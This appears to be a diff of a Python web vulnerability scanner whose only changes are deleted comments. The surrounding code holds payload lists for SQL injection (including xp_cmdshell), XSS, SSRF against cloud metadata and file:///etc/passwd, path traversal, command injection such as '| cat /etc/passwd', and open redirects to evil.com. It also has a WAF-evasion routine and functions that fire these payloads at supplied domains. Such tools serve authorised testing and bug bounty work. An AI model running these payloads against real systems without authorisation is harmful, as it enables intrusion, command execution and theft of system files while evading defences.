@@ -22,24 +22,20 @@ with open(output_file, 'w') as f:
     f.write("Potential Vulnerabilities Log\n")
     f.write("="*50 + "\n")
 
-# Advanced payloads based on CVEs and Bug bounty reports
 payloads = {
     'sqli': [
         "' OR '1'='1", "' UNION SELECT NULL--", "' AND 1=1--", "1' OR 1=1--",
         "admin'--", "' OR '1'='1'/*", "1' OR '1'='1' --", "admin'--", "'; EXEC xp_cmdshell('whoami')--",
-        # Payloads inspired by recent CVEs
         "1 OR 1=1;--", "admin' #", "' UNION SELECT 1, 'foobar', 3--"
     ],
     'xss': [
         '<script>alert(1)</script>', '"><img src=x onerror=alert(1)>', '<svg onload=alert(1)>',
         '<body onload=alert(1)>', '<iframe src="javascript:alert(1)"></iframe>', '" onfocus=alert(1) autofocus="',
-        # Payloads inspired by recent CVEs
         "<img src='x' onerror=alert('XSS')>", "<script>alert('XSS');</script>"
     ],
     'ssrf': [
         'http://169.254.169.254/latest/meta-data/', 'http://localhost:80', 'http://127.0.0.1:22',
         'http://internal.example.com', 'http://0.0.0.0:80', 'file:///etc/passwd',
-        # Payloads inspired by recent CVEs
         'http://127.0.0.1:8000', 'file:///C:/Windows/System32/drivers/etc/hosts'
     ],
     'traversal': [
@@ -50,26 +46,20 @@ payloads = {
     ],
     'cmd_injection': [
         '; ls -la', '| cat /etc/passwd', '&& whoami', '`id`', '|| uname -a', '& netstat -an',
-        # Payloads inspired by recent CVEs
         '; whoami', '| id', '&& echo vulnerable'
     ],
     'open_redirect': [
         'https://evil.com', '//evil.com', '/\\evil.com', '/..%2fevil.com', '/%09evil.com',
-        # Payloads inspired by recent CVEs
         '/%2e%2e%2f%2e%2e%2f/evil.com', '//www.evil.com/%2e%2e%2f'
     ],
     'idor': [
         '1', '2', '3', '4', '5', '10', '100', '999', 'admin', 'root',
-        # Payloads inspired by recent CVEs
         '101', '102', '103', '1000', '9999'
     ],
-    # Add more sophisticated payloads as needed
 }
 
-# Special characters for reflection check
 special_chars = ["'", '"', "<", ">", "&", "%"]
 
-# WAF Evasion techniques
 def evade_waf(payload):
     evasions = [
         quote(payload),  # URL encoding
@@ -80,7 +70,6 @@ def evade_waf(payload):
     ]
     return random.choice(evasions)
 
-# Function to read URLs from stdin or file
 def read_urls_from_file(file_path):
     with open(file_path, 'r') as file:
         return [line.strip() for line in file]
@@ -88,12 +77,10 @@ def read_urls_from_file(file_path):
 def read_urls():
     return [line.strip() for line in sys.stdin]
 
-# Function to log potential vulnerabilities to a file
 def log_vulnerability(vuln_type, url, payload):
     with open(output_file, 'a') as f:
         f.write(f"Type: {vuln_type}\nURL: {url}\nPayload: {payload}\n\n")
 
-# Exception-handled request
 def safe_request(url):
     try:
         response = requests.get(url, timeout=10)
@@ -102,7 +89,6 @@ def safe_request(url):
         logger.error(f"Request failed: {e}")
         return None
 
-# Reflection check
 def check_reflection(url):
     for char in special_chars:
         test_url = f"{url}{quote(char)}"
@@ -112,7 +98,6 @@ def check_reflection(url):
             return True
     return False
 
-# Extract parameters from URL
 def extract_params(url):
     parsed_url = urlparse(url)
     query = parsed_url.query
@@ -125,16 +110,13 @@ def extract_params(url):
     
     return params
 
-# Function to check if URL is API related
 def is_api_url(url):
     return 'api' in url.lower()
 
-# Function to prioritize URLs
 def prioritize_urls(urls):
     interesting_keywords = ['admin', 'login', 'user', 'profile', 'search']
     return sorted(urls, key=lambda url: any(keyword in url for keyword in interesting_keywords), reverse=True)
 
-# SQL Injection scanning function with reflection check and improved validation
 def scan_sqli(url):
     if not check_reflection(url):
         logger.info(f"No reflection found for SQLi check: {url}")
@@ -166,7 +148,6 @@ def scan_xss(url):
                 logger.info(f"Potential XSS found: {test_url}")
                 log_vulnerability('XSS', test_url, evaded_payload)
 
-# SSRF scanning function with reflection check and improved validation
 def scan_ssrf(url):
     if not check_reflection(url):
         logger.info(f"No reflection found for SSRF check: {url}")
@@ -182,7 +163,6 @@ def scan_ssrf(url):
                 logger.info(f"Potential SSRF found: {test_url}")
                 log_vulnerability('SSRF', test_url, evaded_payload)
 
-# Path traversal scanning function with reflection check and improved validation
 def scan_traversal(url):
     if not check_reflection(url):
         logger.info(f"No reflection found for Path Traversal check: {url}")
@@ -198,7 +178,6 @@ def scan_traversal(url):
                 logger.info(f"Potential Path Traversal found: {test_url}")
                 log_vulnerability('Path Traversal', test_url, evaded_payload)
 
-# Command injection scanning function with reflection check and improved validation
 def scan_cmd_injection(url):
     if not check_reflection(url):
         logger.info(f"No reflection found for Command Injection check: {url}")
@@ -214,7 +193,6 @@ def scan_cmd_injection(url):
                 logger.info(f"Potential Command Injection found: {test_url}")
                 log_vulnerability('Command Injection', test_url, evaded_payload)
 
-# Open Redirect scanning function with reflection check and improved validation
 def scan_open_redirect(url):
     if not check_reflection(url):
         logger.info(f"No reflection found for Open Redirect check: {url}")
@@ -247,7 +225,6 @@ def process_url(url):
     else:
         logger.info(f"No parameters found in URL: {url}")
 
-# Main function to handle single domain or multiple domains from file
 def main():
     parser = argparse.ArgumentParser(description='Advanced vulnerability scanner')
     parser.add_argument('-d', '--domain', help='Single domain to scan')
